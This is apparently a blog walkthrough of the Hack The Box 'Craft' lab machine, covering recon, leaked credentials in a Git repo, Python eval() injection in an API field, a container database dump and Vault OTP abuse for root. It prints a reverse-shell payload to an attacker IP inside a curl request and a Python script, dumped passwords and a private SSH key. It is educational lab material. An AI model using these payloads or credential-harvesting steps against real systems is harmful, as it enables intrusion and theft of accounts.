---
layout:     post
title:      Hack the Box - Craft
date:       2020-1-07 17:00:00 -0400
summary:    HTB Craft machine walkthrough. Stepping through methodology of what worked, what didn't and any interesting notes gleaned along the way.
categories: hack-the-box
thumbnail: cogs
tags:
 - htb 
 - walkthrough
 - writeup
 - gogs
 - rce
 - docker
 - vault
---

<h1>Introduction</h1>
<p align="center">
<img width="75%" height="75%" src="{{ '/assets/htb-craft/infocard.PNG' | relative_url }}">
</p>

<p>Craft was a well designed moderate box from HTB that exemplified bad coding practice, sensitive data disclosures and token abuse into root. From a technical standpoint this machine did not introduce any drastic new concepts however I did enjoy the thought that went into the box and it allowed me a chance to be hands-on with the VaultProject solution. Let's dive right into it.</p>

<h1>Initial Recon</h1>

<p>As per usual we start off with enumerating the machine using NMAP.</p>

{% highlight shell %}
root@kali:~# nmap -sV -sT -sC 10.10.10.110
Starting Nmap 7.70 ( https://nmap.org ) at 2019-10-12 15:14 EDT
Nmap scan report for 10.10.10.110
Host is up (0.023s latency).
Not shown: 998 closed ports
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 7.4p1 Debian 10+deb9u5 (protocol 2.0)
| ssh-hostkey: 
|   2048 bd:e7:6c:22:81:7a:db:3e:c0:f0:73:1d:f3:af:77:65 (RSA)
|   256 82:b5:f9:d1:95:3b:6d:80:0f:35:91:86:2d:b3:d7:66 (ECDSA)
|_  256 28:3b:26:18:ec:df:b3:36:85:9c:27:54:8d:8c:e1:33 (ED25519)
443/tcp open  ssl/http nginx 1.15.8
|_http-server-header: nginx/1.15.8
|_http-title: About
| ssl-cert: Subject: commonName=craft.htb/organizationName=Craft/stateOrProvinceName=NY/countryName=US
| Not valid before: 2019-02-06T02:25:47
|_Not valid after:  2020-06-20T02:25:47
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|_  http/1.1
| tls-nextprotoneg: 
|_  http/1.1
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
{% endhighlight %}

<p>The main page did not have anything useful at first look. Digging a bit under the hood we do discover that there are two additional domains.</p>

{% highlight shell %}
<ul class="nav navbar-nav pull-right">
    <li><a href="https://api.craft.htb/api/">API</a></li>
    <li><a href="https://gogs.craft.htb/"><img border="0" alt="Git" src="/static/img/Git-Icon-Black.png" width="20" height="20"></a></li>
</ul>
{% endhighlight %}

<p>We then add the domains to our hosts file and take another look.</p>

{% highlight shell %}
root@kali:~# cat /etc/hosts
127.0.0.1	localhost
127.0.1.1	kali
10.10.10.110	craft.htb
10.10.10.110	gogs.craft.htb
10.10.10.110	api.craft.htb
{% endhighlight %}

<p align="center">
<img src="{{ '/assets/htb-craft/api.PNG' | relative_url }}">
</p>

<p>Initially I believed the API endpoints would be our initial avenue in, however after exploring <code>/auth/check</code> and <code>/auth/login</code> that thought changed. We do have the ability to login and check whether a token is valid, however do not have an idea on valid credentials are just yet.</p>

<p>Once we move over to <code>gogs.craft.htb</code> we immediately see that a gogs (a self-hosted Git service) instance is running.</p>

<p align="center">
<img src="{{ '/assets/htb-craft/gogs.PNG' | relative_url }}">
</p>

<p>We discovered that the <code>craft-api</code> repository was publicly accessible. Perusing the repo we stumble upon two interesting tidbits.</p>

<p align="center">
<img src="{{ '/assets/htb-craft/brew-api-test.PNG' | relative_url }}">
</p>

<p align="center">
<img src="{{ '/assets/htb-craft/brew-gogs-abv-issue.PNG' | relative_url }}">
</p>

<p>Based on these finds and with the previous <code>/auth/login</code> api endpoint we looked at we're starting to shape up. We should initially be able to login and generate a valid token as <code>dinesh</code> using his credentials. Combine this with an unsanitized <code>eval()</code> in the <code>/brew</code> endpoint and we should be able to be able to pass a payload through a <code>POST</code> request. A few different payloads were tested however the following payload ended up working</p>

{% highlight shell %}
"abv":"__import__('os').system('bash -i >& /dev/tcp/10.10.xx.xx/1337 0>&1")"
{% endhighlight %}

<p>Combining all the parts we write a small script to put it all together.</p>

{% highlight python %}
root@kali:~/Desktop/HTB/Craft# cat test.py 
#!/usr/bin/env python

import requests
import json

response = requests.get('https://api.craft.htb/api/auth/login',  auth=('dinesh', '4aUh0A8PbVJxgd'), verify=False)
json_response = json.loads(response.text)
token = json_response['token']#'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoidXNlciIsImV4cCI6MTU0OTM4NTI0Mn0.-wW1aJkLQDOE-GP5pQd3z_BJTe2Uo0jJ_mQ238P5Dqw'

headers = { 'X-Craft-API-Token': token, 'Content-Type': 'application/json'  }

print(headers)
# make sure token is valid
response = requests.get('https://api.craft.htb/api/auth/check', headers=headers, verify=False)
print(response.text)

# create a sample brew with bogus ABV... should fail.

print("Create bogus ABV brew")
brew_dict = {}
brew_dict['abv'] = '__import__(\'os\').system(\'bash -i >& /dev/tcp/10.10.xx.xx/1337 0>&1")"'
brew_dict['name'] = 'blah'
brew_dict['brewer'] = 'blah'
brew_dict['style'] = 'blah'

response = requests.post('https://api.craft.htb/api/brew/', headers=headers, data=json_data, verify=False)
print(response.text)
{% endhighlight %}

<p>Despite generating a valid token and submitting a bogus ABV successfully I had issues getting the payload to trigger through the script. I ended up going the manual route and executed it directly.</p>

{% highlight shell %}
root@kali:~/Desktop/HTB/Craft# curl -H "X-Craft-API-Token: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiZGluZXNoIiwiZXhwIjoxNTcwOTE0NTYwfQ.y72h6WBiAdhEQ7X9BFNoBHhYSOiRbmynWs1Hp_X8c9M" -H "Content-Type: application/json" -k -X POST https://api.craft.htb/api/brew/ --data '{"name":"test","brewer":"test", "style": "test", "abv":"__import__('os').system('bash -i >& /dev/tcp/10.10.xx.xx/1337 0>&1")"}'
{% endhighlight %}

<p align="center">
<img src="{{ '/assets/htb-craft/docker-listener.PNG' | relative_url }}">
</p>

<h1>User exploitation</h1>

<p>Wait, root!? Well let's just pop over and get our root flag. Doh... after a few seconds of poking around it became evident that we were in a docker container, not the actual host.</p>

<p>After a bit of poking around we discover a <code>dbtest.py</code> file that seems to connect to the mysql instance running on the docker instance.</p>

{% highlight python %}
/opt/app # cat dbtest.py
#!/usr/bin/env python

import pymysql
from craft_api import settings

# test connection to mysql database

connection = pymysql.connect(host=settings.MYSQL_DATABASE_HOST,
                             user=settings.MYSQL_DATABASE_USER,
                             password=settings.MYSQL_DATABASE_PASSWORD,
                             db=settings.MYSQL_DATABASE_DB,
                             cursorclass=pymysql.cursors.DictCursor)

try: 
    with connection.cursor() as cursor:
        sql = "SELECT `id`, `brewer`, `name`, `abv` FROM `brew` LIMIT 1"
        cursor.execute(sql)
        result = cursor.fetchone()
        print(result)

finally:
    connection.close()
{% endhighlight %}

<p>We copy this file and make slight modifications to see if we can enumerate some data from the mysql instance. Firstly, and this is the part that tripped me up for much too long, we need to change <code>cursor.fetchone()</code> to <code>cursor.fetchall()</code>. This little oversight caused me a lot of pain and ended up sending me down a few rabbit holes before realizing my mistakes. With fetchall set, we can change the query itself to:</p>

{% highlight python %}
sql = "SELECT * FROM user"
{% endhighlight %}

<p>We could use "SHOW TABLES" instead of the query above to determine the tables <code>user</code> and <code>brew</code> would exist, however I initially took a guess and assumed a table <code>user</code> would be present. The final code used ends up looking like the following.</p>

{% highlight python %}
#!/usr/bin/env python

import pymysql
from craft_api import settings

# test connection to mysql database

connection = pymysql.connect(host=settings.MYSQL_DATABASE_HOST,
                             user=settings.MYSQL_DATABASE_USER,
                             password=settings.MYSQL_DATABASE_PASSWORD,
                             db=settings.MYSQL_DATABASE_DB,
                             cursorclass=pymysql.cursors.DictCursor)

try: 
    with connection.cursor() as cursor:
        sql = "SELECT * FROM user"
        cursor.execute(sql)
        result = cursor.fetchall()
        print(result)

finally:
    connection.close()
{% endhighlight %}

<p>And just like that we now have a few more credentials to add to the list.</p>

{% highlight shell %}
/opt/app # python dbtest2.py
[{'id': 1, 'username': 'dinesh', 'password': '4aUh0A8PbVJxgd'}, 
{'id': 4, 'username': 'ebachman', 'password': 'llJ77D8QFkLPQB'}, 
{'id': 5, 'username': 'gilfoyle', 'password': 'ZEU3N8WNM2rh4T'}]
{% endhighlight %}

<p>With these credentials we can try a few different thing: SSH into the host and attempt to log back in to the <code>gogs</code> instance. SSH was unfortunately a bust but<code>gilfoyle</code> ends up being our lucky credential set and we manage to get in to the <code>gogs</code> instance. In addition to the previous <code>craft-api</code> repo we now also have access to the repo <code>craft-infra</code>. Let's poke around and see what additional information we can find!</p>

<p align="center">
<img src="{{ '/assets/htb-craft/user-gilfoyle.PNG' | relative_url }}">
</p>

<p>Immediately my attention was drawn to the <code>.ssh</code> folder. Sure enough we manage to get what seems like <code>gilfoyle</code>'s private key into the host.</p>

{% highlight shell %}
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAACmFlczI1Ni1jdHIAAAAGYmNyeXB0AAAAGAAAABDD9Lalqe
qF/F3X76qfIGkIAAAAEAAAAAEAAAEXAAAAB3NzaC1yc2EAAAADAQABAAABAQDSkCF7NV2Z
F6z8bm8RaFegvW2v58stknmJK9oS54ZdUzH2jgD0bYauVqZ5DiURFxIwOcbVK+jB39uqrS
zU0aDPlyNnUuUZh1Xdd6rcTDE3VU16roO918VJCN+tIEf33pu2VtShZXDrhGxpptcH/tfS
RgV86HoLpQ0sojfGyIn+4sCg2EEXYng2JYxD+C1o4jnBbpiedGuqeDSmpunWA82vwWX4xx
lLNZ/ZNgCQTlvPMgFbxCAdCTyHzyE7KI+0Zj7qFUeRhEgUN7RMmb3JKEnaqptW4tqNYmVw
pmMxHTQYXn5RN49YJQlaFOZtkEndaSeLz2dEA96EpS5OJl0jzUThAAAD0JwMkipfNFbsLQ
B4TyyZ/M/uERDtndIOKO+nTxR1+eQkudpQ/ZVTBgDJb/z3M2uLomCEmnfylc6fGURidrZi
4u+fwUG0Sbp9CWa8fdvU1foSkwPx3oP5YzS4S+m/w8GPCfNQcyCaKMHZVfVsys9+mLJMAq
Rz5HY6owSmyB7BJrRq0h1pywue64taF/FP4sThxknJuAE+8BXDaEgjEZ+5RA5Cp4fLobyZ
3MtOdhGiPxFvnMoWwJLtqmu4hbNvnI0c4m9fcmCO8XJXFYz3o21Jt+FbNtjfnrIwlOLN6K
Uu/17IL1vTlnXpRzPHieS5eEPWFPJmGDQ7eP+gs/PiRofbPPDWhSSLt8BWQ0dzS8jKhGmV
ePeugsx/vjYPt9KVNAN0XQEA4tF8yoijS7M8HAR97UQHX/qjbna2hKiQBgfCCy5GnTSnBU
GfmVxnsgZAyPhWmJJe3pAIy+OCNwQDFo0vQ8kET1I0Q8DNyxEcwi0N2F5FAE0gmUdsO+J5
0CxC7XoOzvtIMRibis/t/jxsck4wLumYkW7Hbzt1W0VHQA2fnI6t7HGeJ2LkQUce/MiY2F
5TA8NFxd+RM2SotncL5mt2DNoB1eQYCYqb+fzD4mPPUEhsqYUzIl8r8XXdc5bpz2wtwPTE
cVARG063kQlbEPaJnUPl8UG2oX9LCLU9ZgaoHVP7k6lmvK2Y9wwRwgRrCrfLREG56OrXS5
elqzID2oz1oP1f+PJxeberaXsDGqAPYtPo4RHS0QAa7oybk6Y/ZcGih0ChrESAex7wRVnf
CuSlT+bniz2Q8YVoWkPKnRHkQmPOVNYqToxIRejM7o3/y9Av91CwLsZu2XAqElTpY4TtZa
hRDQnwuWSyl64tJTTxiycSzFdD7puSUK48FlwNOmzF/eROaSSh5oE4REnFdhZcE4TLpZTB
a7RfsBrGxpp++Gq48o6meLtKsJQQeZlkLdXwj2gOfPtqG2M4gWNzQ4u2awRP5t9AhGJbNg
MIxQ0KLO+nvwAzgxFPSFVYBGcWRR3oH6ZSf+iIzPR4lQw9OsKMLKQilpxC6nSVUPoopU0W
Uhn1zhbr+5w5eWcGXfna3QQe3zEHuF3LA5s0W+Ql3nLDpg0oNxnK7nDj2I6T7/qCzYTZnS
Z3a9/84eLlb+EeQ9tfRhMCfypM7f7fyzH7FpF2ztY+j/1mjCbrWiax1iXjCkyhJuaX5BRW
I2mtcTYb1RbYd9dDe8eE1X+C/7SLRub3qdqt1B0AgyVG/jPZYf/spUKlu91HFktKxTCmHz
6YvpJhnN2SfJC/QftzqZK2MndJrmQ=
-----END OPENSSH PRIVATE KEY-----
{% endhighlight %}

<p>Copying the contents over to our own host we attempt to SSH into the host using the key. We're asked for the key's password, and we made an assumption that <code>gilfoyle</code> uses the same password in various places. Sure enough, we are successful and finally have access to the user flag.</p>

<p align="center">
<img src="{{ '/assets/htb-craft/user-owned.PNG' | relative_url }}">
</p>

<h1>Root exploitation</h1>

<p>For as long as it took to get to the user flag the root flag seemed much simpler in comparison. From the user homedirectory we found something interesting - a <code>.vault-token</code>.</p>

{% highlight shell %}
gilfoyle@craft:~$ cat .vault-token 
f1783c8d-41c7-0b12-d1c1-cf2aa17ac6b9
{% endhighlight %}

<p>After a bit of searching around discovered that this is a <a href="https://www.vaultproject.io/docs/secrets/ssh/one-time-ssh-passwords.html">VaultProject Token</a> and is used to generate One-Time Passwords (OTP) and can be used for various things, including SSH. This seems like an interesting avenue. Sure enough, quickly see that this is what we are dealing with by confirming that <code>vault</code> utlity is installed on the machine, and that we can see the <code>root_otp</code> SSH role is defined on the repo.</p>

<p align="center">
<img src="{{ '/assets/htb-craft/root-vault.PNG' | relative_url }}">
</p>

{% highlight shell %}
# set up vault secrets backend

vault secrets enable ssh

vault write ssh/roles/root_otp \
    key_type=otp \
    default_user=root \
    cidr_list=0.0.0.0/0
{% endhighlight %}

<p>With this information in our hands, we are able to initiate an OTP request and acquire a root shell.</p>

{% highlight shell %}
gilfoyle@craft:/usr/bin$ vault login token=f1783c8d-41c7-0b12-d1c1-cf2aa17ac6b9
Success! You are now authenticated. The token information displayed below
is already stored in the token helper. You do NOT need to run "vault login"
again. Future Vault requests will automatically use this token.

Key                  Value
---                  -----
token                f1783c8d-41c7-0b12-d1c1-cf2aa17ac6b9
token_accessor       1dd7b9a1-f0f1-f230-dc76-46970deb5103
token_duration       ∞
token_renewable      false
token_policies       ["root"]
identity_policies    []
policies             ["root"]
{% endhighlight %}

<p align="center">
<img src="{{ '/assets/htb-craft/root-owned.PNG' | relative_url }}">
</p>

<p>And just like that we finish up our journey with Craft. Thanks everyone, until next time!</p>